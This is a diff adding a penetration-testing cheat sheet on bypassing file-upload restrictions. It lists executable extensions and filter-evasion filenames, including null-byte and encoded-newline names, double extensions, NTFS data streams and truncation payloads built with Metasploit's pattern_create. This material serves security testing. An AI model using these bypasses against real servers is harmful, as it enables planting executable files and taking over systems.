@@ -1,0 +1,52 @@
+# File Upload General Methodology
+
+• Other useful extensions:
+- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+- ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+- Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+- Coldfusion: .cfm, .cfml, .cfc, .dbm
+- Flash: .swf
+- Perl: .pl, .cgi
+- Erlang Yaws Web Server: .yaws
+
+Bypass file extensions checks
+1. If they apply, the check the previous extensions. Also test them using some uppercase letters: 
+pHp, .pHP5, .PhAr ...
+2. Check adding a valid extension before the execution extension (use previous extensions also):
+- file.png.php
+- file.png.Php5
+3. Try adding special characters at the end. You could use Burp to bruteforce all the ascii and Unicode characters. (Note that you can also try to use the previously motioned extensions)
+- file.php%20
+- file.php%0a
+- file.php%00
+- file.php%0d%0a
+- file.php/
+- file.php.\
+- file.
+- file.php....
+- file.pHp5....
+4. Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.
+- file.png.php
+- file.png.pHp5
+- file.php%00.png
+- file.php\x00.png
+- file.php%0a.png
+- file.php%0d%0a.png
+- flile.phpJunk123png
+5. Add another layer of extensions to the previous check:
+- file.png.jpg.php
+- file.php%00.png%00.jpg
+
+6. Try to put the exec extension before the valid extension and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** .php, but not necessarily ending in .php** will execute code):
+ex: file.php.png
+7. Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)
+8. Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php
+
+# Linux maximum 255 bytes
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
+# Upload the file and check response how many characters it alllows. Let's say 236
+python -c 'print "A" * 232'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Make the payload
+AAA<--SNIP 232 A-->AAA.php.png
